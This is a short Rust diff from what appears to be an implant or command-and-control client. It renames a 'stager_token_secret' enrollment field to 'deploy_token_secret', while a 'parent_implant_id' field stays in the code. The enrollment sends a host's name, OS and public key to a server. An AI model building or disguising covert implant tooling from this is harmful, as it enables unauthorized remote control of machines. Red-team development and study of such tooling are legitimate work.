@@ -17,7 +17,7 @@ use crate::trust::{self, Certificate};
 #[derive(Serialize)]
 #[serde(rename_all = "camelCase")]
 struct EnrollBody<'a> {
-    stager_token_secret: &'a str,
+    deploy_token_secret: &'a str,
     public_key: String,
     hostname: String,
     os: &'a str,
@@ -70,7 +70,7 @@ impl KeyPair {
 /// the caller's retry policy (a definitive refusal ends the run).
 pub fn enroll(url: &str, profile: &Profile, keys: &KeyPair) -> Result<Enrollment, String> {
     let body = EnrollBody {
-        stager_token_secret: &profile.token,
+        deploy_token_secret: &profile.token,
         public_key: keys.public_spki_base64(),
         hostname: hostname(),
         os: std::env::consts::OS,
@@ -194,7 +194,7 @@ fn enroll_over_socket(url: &str, profile: &Profile, keys: &KeyPair) -> Result<En
     stream.set_nodelay(true).ok();
 
     let request = crate::wire::EnrollRequest {
-        stager_token_secret: profile.token.clone(),
+        deploy_token_secret: profile.token.clone(),
         class: String::new(),
         public_key: keys.public_spki_der(),
         parent_implant_id: String::new(),
